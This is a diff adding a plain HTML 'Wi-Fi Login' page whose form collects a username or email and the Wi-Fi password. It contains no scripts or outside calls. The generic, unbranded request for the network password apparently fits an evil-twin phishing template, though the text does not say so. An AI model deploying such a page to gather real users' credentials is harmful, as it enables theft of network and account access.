@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <meta name="description" content="Wi-Fi Login Page">
+    <meta name="keywords" content="Wi-Fi">
+
+  <title>Wi-Fi Login</title>
+  <style>
+    body {
+      background-image: url("https://media.istockphoto.com/id/1390650720/photo/digital-network-connection-abstract-connection-of-dots-and-lines-technology-background-plexus.jpg?s=612x612&w=0&k=20&c=mX3Pe2x4I6ZQp5S6m9kOPo6CIiUB7lB82nD8T0vnEAI=");
+        background-size: cover;
+        color: white;
+      font-size: 18px;
+        height: 50vh;
+        display: flex;
+        flex-direction: column;
+        justify-content: start;
+        align-items: center;
+      background-color: #eee;
+      font-family: Arial;
+      text-align: center;
+      padding: 50px;
+    }
+    form {
+      background: white;
+      padding: 30px;
+      margin: auto;
+      width: 300px;
+      border-radius: 10px;
+      box-shadow: 0 0 10px gray;
+    }
+    input {
+      width: 90%;
+      padding: 10px;
+      margin: 10px 0;
+    }
+    button {
+      padding: 10px;
+      background-color: #28a745;
+      color: white;
+      border: none;
+      width: 100%;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <h2>Wi-Fi Registation</h2>
+    <p>Please enter your username and password to connect to the Wi-Fi and manage your network.</p>
+  <form method="POST">
+    <input type="text" name="username" placeholder="Username or Email" required><br>
+    <input type="password" name="password" placeholder="Wi-Fi Password" required><br>
+    <button type="submit">Login</button>
+  </form>
+</body>
+</html>
